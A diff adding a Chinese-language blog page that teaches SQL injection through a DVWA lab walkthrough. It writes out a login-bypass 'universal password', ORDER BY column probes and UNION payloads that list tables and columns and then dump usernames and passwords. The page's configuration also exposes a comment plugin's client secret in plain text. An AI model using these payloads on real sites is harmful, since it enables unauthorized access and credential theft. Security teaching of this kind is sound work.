@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Latte">
+    
+    <title>
+        
+            SQL注入 |
+        
+        Latte&#39;s
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/logo.svg">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/font/css/brands.min.css">
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"ohvy.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Latte's","author":"Latte","avatar":"/images/cat.svg","logo":"/images/logo.svg","favicon":"/images/logo.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","tools":"/tools","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Latte and Americano.","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/ohvy","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":"shiwwang@163.com"}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":true,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":false},"comment":{"enable":true,"use":"gitalk","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":"ohvy","github_admins":null,"repository":"gitalk","client_id":"Ov23liQm7PTQpK5JLa0h","client_secret":"ba0525d7d59a301a09ac76ed9299df6ceb9a42a5","proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2022,"word_count":false,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{"tools":[{"category":"聊天 AI"},{"name":"ChatGPT","link":"https://chat.openai.com/","description":"OpenAI 旗下 AI 聊天对话工具","image":"/images/tools/chatgpt.svg"},{"name":"Gemini","link":"https://gemini.google.com/app","description":"Google 旗下 AI 聊天对话工具","image":"/images/tools/gemini.svg"},{"category":"待开发"}]},"version":"4.1.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Latte&#39;s
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                
+                                首页
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                
+                                归档
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                
+                                标签
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                
+                                分类
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tools"
+                            >
+                                
+                                工具
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/"
+                    >首页</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives"
+                    >归档</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags"
+                    >标签</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories"
+                    >分类</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tools"
+                    >工具</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about"
+                    >关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        SQL注入
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/cat.svg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Latte</span>
+                                
+                                    <span class="author-badge">Lv2</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2022-12-15 04:09:03</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Mon May 06 2024 20:06:11 GMT+0800">2024-05-06 20:06:11</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E6%B8%97%E9%80%8F%EF%BC%9A%E4%BB%8E0%E5%88%B01/">渗透：从0到1</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/web/">web</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body">
+                    
+
+                    <h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><h2 id="SQL注入产生的原因"><a href="#SQL注入产生的原因" class="headerlink" title="SQL注入产生的原因"></a>SQL注入产生的原因</h2><p>当Web应用向后台数据库传递<strong>SQL语句</strong>进行数据库操作时，如果用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p>
+<h2 id="SQL注入的本质"><a href="#SQL注入的本质" class="headerlink" title="SQL注入的本质"></a>SQL注入的本质</h2><p>把用户输入的数据<strong>当作代码来执行</strong>，违背了“<strong>数据与代码分离</strong>”的原则。</p>
+<h2 id="SQL注入的关键点"><a href="#SQL注入的关键点" class="headerlink" title="SQL注入的关键点"></a>SQL注入的关键点</h2><ol>
+<li>用户能够控制输入的内容；</li>
+<li>Web应用把用户输入的内容带到数据库中执行</li>
+</ol>
+<h1 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h1><ol>
+<li>盗取网站的敏感信息</li>
+<li>绕过后台认证<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">后台登录语句</span><br><span class="line">select * from admin where username = &#x27;admin&#x27; and password = &#x27;password&#x27;</span><br><span class="line">万能密码</span><br><span class="line">&#x27; or &#x27;1&#x27; = &#x27;1&#x27; #</span><br></pre></td></tr></table></figure></li>
+<li>借助SQL注入漏洞提权获取系统权限</li>
+<li>读取文件信息</li>
+</ol>
+<h1 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h1><ol>
+<li><p>根据诸如位置分类：GET型、POST型、Head头注入</p>
+</li>
+<li><p>根据反馈结果分类：有回显、无回显</p>
+<p> Ⅰ. 有回显</p>
+<ul>
+<li>可以联合查询的注入</li>
+<li>报错注入</li>
+<li>通过注入进行DNS请求，从而达到可回显的目的</li>
+</ul>
+<p> Ⅱ. 无回显</p>
+<ul>
+<li>Bool盲注</li>
+<li>时间盲注</li>
+</ul>
+</li>
+<li><p>根据数据类型分类：数字型（输入的参数为整型，如id、年龄、页码等），字符型（输入的参数为字符串）</p>
+</li>
+</ol>
+<p>数字型与字符型最大的区别在于：数字型不需要单引号闭合，而字符型一般需要单引号闭合。</p>
+<p>另外还需注意<strong>二次注入</strong>，一般需要自己编写代码以实现自动化注入。</p>
+<h1 id="SQL注入的流程"><a href="#SQL注入的流程" class="headerlink" title="SQL注入的流程"></a>SQL注入的流程</h1><h2 id="注入点的位置及发现"><a href="#注入点的位置及发现" class="headerlink" title="注入点的位置及发现"></a>注入点的位置及发现</h2><p>SQL注入需要寻找<strong>与数据库有关联</strong>的请求。常见的注入点不一定是表单中的username字段，有时候注入点还会隐藏在不同的地方，下面我们来介绍几个常见的注入点的位置。</p>
+<ul>
+<li><strong>GET参数中的注入：</strong><br>GET中的注入点一般最容易发现，因为我们可以在地址栏获取URL和参数等，可以用<strong>Sqlmap或者手工验证</strong>是否存在注入。</li>
+<li><strong>POST中的注入：</strong><br>POST中的注入点一般需要我们通过<strong>抓包操作</strong>来发现，如使用Burp或Hackbar来发送POST包。同样也可以使用<strong>Sqlmap或者手工验证</strong>。</li>
+<li><strong>User-Agent中的注入：</strong><br>在希望发现User-Agent中的注入时，可以使用Burp中的Repeater模块，或者Sqlmap。将Sqlmap的参数设置为：<code>level=3</code>，这样Sqlmap会自动检测User-Agent中是否存在注入。</li>
+<li><strong>Cookie中的注入：</strong><br>想要发现Cookie中的注入， 可以使用Burp中的Repeater模块，或者Sqlmap。将Sqlmap的参数设置为：<code>level=2</code>，这样Sqlmap会自动检测Cookie中中是否存在注入。</li>
+</ul>
+<h2 id="判读注入点是否存在"><a href="#判读注入点是否存在" class="headerlink" title="判读注入点是否存在"></a>判读注入点是否存在</h2><p>在判断输入点是否存在注入时，可以先假设原程序执行的SQL语句，如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT UserName FROM User WHERE id = &#x27;$id&#x27;;    // 参数为字符串</span><br><span class="line">或</span><br><span class="line">SELECT UserName FROM User WHERE id = $id;   // 参数为数字</span><br></pre></td></tr></table></figure>
+
+<p>然后通过以下几种方法进行判断：</p>
+<ul>
+<li><strong>插入单引号：</strong><br>插入单引号是我们最常用的检测办法，原理在于未闭合的单引号会引起<strong>SQL语句单引号未闭合</strong>的错误</li>
+<li><strong>数字型判断：</strong><br>通过 <code>or 1=1</code> （数字型）和闭合单引号的测试语句 <code>&#39;or &#39;1&#39;=&#39;1</code> 进行判断，这里采用Payload <code>&#39;1&#39;=&#39;1</code> 的目的是<strong>闭合原语句后方的单引号</strong>，也可以选择<code>&#39;1&#39;=&#39;1&#39;#</code>注释掉后面的单引号</li>
+<li><strong>通过数字的加减判断：</strong><br>比如，我们在遇到的题目中抓到了链接 <code>http://example.com/?id=2</code> 就可以进行如下的尝试 <code>http://example.com/?id=3-1</code> . 如果二者结果相同，则证明id这个输入点可能存在SQL注入漏洞</li>
+</ul>
+<h2 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="*判断闭合方式"></a>*判断闭合方式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1cccc</span><br></pre></td></tr></table></figure>
+
+<p>有报错：数字型，无闭合或用 <code>)</code> 闭合</p>
+<p>无报错：字符型，再用： <code>&#39;</code> , <code>&quot;</code> , <code>&#39;)</code> , <code>&quot;)</code> 根据报错信息判断</p>
+<h2 id="判断字段数（列数）及回显位"><a href="#判断字段数（列数）及回显位" class="headerlink" title="判断字段数（列数）及回显位"></a>判断字段数（列数）及回显位</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3#</span><br><span class="line">?id=1&#x27; order by 2#</span><br></pre></td></tr></table></figure>
+<p>利用SQL的特性，当查询时<code>order by</code>后的数字大于列数时就会报错，根据这一点可判断列数（借助二分法可快速判断）</p>
+
+
+<p><code>order by 3</code>时报错，<code>order by 2</code>时不报错，表名为两个字段。</p>
+
+
+<h2 id="UNION-联合查询"><a href="#UNION-联合查询" class="headerlink" title="UNION 联合查询"></a>UNION 联合查询</h2><p>UNION关键字，联合查询，可以实现将两个select语句合并为一条语句，并显示为一个结果。</p>
+<img  
+                       lazyload
+                       alt="image"
+                       data-src="/2022/12/15/SQL%E6%B3%A8%E5%85%A5/union.png"
+                        class="" title="联合查询"
+                 >
+
+<p>需要注意，联合查询下，两个select语句所查询的表一定为<strong>相同字段数量</strong>！</p>
+<p>MySQL基础查询语法告诉我们查询<strong>系统当前使用的数据库名称</strong>的方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select database();  // 查询查询当前数据库名称</span><br></pre></td></tr></table></figure>
+
+<p>而如果培训和<code>union</code>联合查询，必须构造<strong>相同字段数</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1, database();   // 两个字段</span><br><span class="line">select 1, 2, database();    // 三个字段</span><br></pre></td></tr></table></figure>
+
+<img  
+                       lazyload
+                       alt="image"
+                       data-src="/2022/12/15/SQL%E6%B3%A8%E5%85%A5/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D.png"
+                        class="" title="联合查询数据库名"
+                 >
+
+<p>利用这一点，可以联合查询出数据库名：</p>
+<img  
+                       lazyload
+                       alt="image"
+                       data-src="/2022/12/15/SQL%E6%B3%A8%E5%85%A5/%E9%9D%B6%E5%9C%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E6%9F%A5%E8%AF%A2.png"
+                        class="" title="联合查询数据库名"
+                 >
+
+<p>并且可以知道，第一个字段的值将会显示在<code>First name</code>处，第二个字段的值将会显示在<code>Surname</code>处。</p>
+<p>接下来我们需要查询数据库的表有什么内容，这将会利用这个自带的数据库来查询表名—— <code>information_schema</code> , 在该数据库中存在 <code>tables</code> 表， 提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select id from test.students;    //跨数据库查询test库中的students表的id字段(只显示id这一列)</span><br><span class="line">select table_name from information_schema.tables; //查询所有的表名</span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27;;    //查询数据库dvwa的中的所有表名</span><br></pre></td></tr></table></figure>
+
+<p>由此构造联合查询sql语句，payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; union select 1, table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27;#  //后面的&#x27;#可去掉</span><br></pre></td></tr></table></figure>
+
+<img  
+                       lazyload
+                       alt="image"
+                       data-src="/2022/12/15/SQL%E6%B3%A8%E5%85%A5/tablenames.png"
+                        class="" title="联合查询表名"
+                 >
+
+<p>由此获得目的数据库中的所有表的表名。由于字段数未知，还需要借助 <code>information_schema</code> 的 <code>COLUMNS</code> 表，该表提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=&#x27;users&#x27;;    //查询users表的所有列名</span><br><span class="line"># 注入payload</span><br><span class="line">0&#x27; union select 1, column_name from information_schema.columns where table_name=&#x27;users</span><br><span class="line"># group_concat(column_name) 使在一条记录中显示</span><br><span class="line">0&#x27; union select 1, group_concat(column_name) from information_schema.columns where table_name=&#x27;users</span><br></pre></td></tr></table></figure>
+
+<img  
+                       lazyload
+                       alt="image"
+                       data-src="/2022/12/15/SQL%E6%B3%A8%E5%85%A5/c.png"
+                        class="" title="联合查询列名"
+                 >
+
+<p>由此得到了数据库名、表名、列名，就可以配合select查询语句，获取每一条记录的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; union select user, password from users#</span><br></pre></td></tr></table></figure>
+
+<img  
+                       lazyload
+                       alt="image"
+                       data-src="/2022/12/15/SQL%E6%B3%A8%E5%85%A5/%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.png"
+                        class="" title="查询结果"
+                 >
+
+
+                </div>
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/web/">web</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到 QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="分享到微信"
+            data-tooltip-img-tip="微信扫一扫"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到微博"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2022/12/24/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"
+                                   title="XSS跨站脚本攻击"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">XSS跨站脚本攻击</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2022/12/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/"
+                                   title="数据库基础"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">数据库基础</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="gitalk-comment-container">
+        <div id="gitalk-container"></div>
+        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.css">
+        <script 
+                src="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        ></script>
+        <script 
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          window.KeepCommentPlugin.initGitalk = () => {
+            let gitalkPathname = decodeURI(location.pathname)
+            const gitalkPathnameLength = gitalkPathname.length
+            const gitalkPathnameMaxLength = 50
+            if (gitalkPathnameLength > gitalkPathnameMaxLength) {
+              gitalkPathname = gitalkPathname.substring(0, gitalkPathnameMaxLength - 3) + '...'
+            }
+
+            if (window?.Gitalk) {
+              new Gitalk({
+                clientID: 'Ov23liQm7PTQpK5JLa0h',
+                clientSecret: 'ba0525d7d59a301a09ac76ed9299df6ceb9a42a5',
+                repo: 'gitalk',
+                owner: 'ohvy',
+                admin: 'ohvy',
+                id: gitalkPathname,
+                proxy: '',
+                language: 'zh-CN'
+              }).render('gitalk-container')
+              window.KeepCommentPlugin.hideLoading()
+            } else {
+              setTimeout(() => {
+                window.KeepCommentPlugin.initGitalk()
+              }, 1000)
+            }
+          }
+
+          if ('false' === 'true') {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initGitalk()
+            }, 1200)
+          } else {
+            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initGitalk)
+          }
+        </script>
+    </div>
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="nav-text">SQL注入原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="nav-text">SQL注入产生的原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%9C%AC%E8%B4%A8"><span class="nav-text">SQL注入的本质</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%B3%E9%94%AE%E7%82%B9"><span class="nav-text">SQL注入的关键点</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="nav-text">SQL注入的危害</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%86%E7%B1%BB"><span class="nav-text">SQL注入的分类</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="nav-text">SQL注入的流程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E7%9A%84%E4%BD%8D%E7%BD%AE%E5%8F%8A%E5%8F%91%E7%8E%B0"><span class="nav-text">注入点的位置及发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E8%AF%BB%E6%B3%A8%E5%85%A5%E7%82%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8"><span class="nav-text">判读注入点是否存在</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="nav-text">*判断闭合方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0%EF%BC%88%E5%88%97%E6%95%B0%EF%BC%89%E5%8F%8A%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="nav-text">判断字段数（列数）及回显位</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UNION-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="nav-text">UNION 联合查询</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box default">
+        
+            <div class="copyright-info info-item default">
+                &copy;&nbsp;<span>2022</span>&nbsp;-&nbsp;2024
+                
+                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Latte</a>
+                
+            </div>
+
+            <div class="theme-info info-item default">
+                由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+            </div>
+
+            
+
+            
+        
+
+        <div class="count-item info-item default">
+            
+
+            
+
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
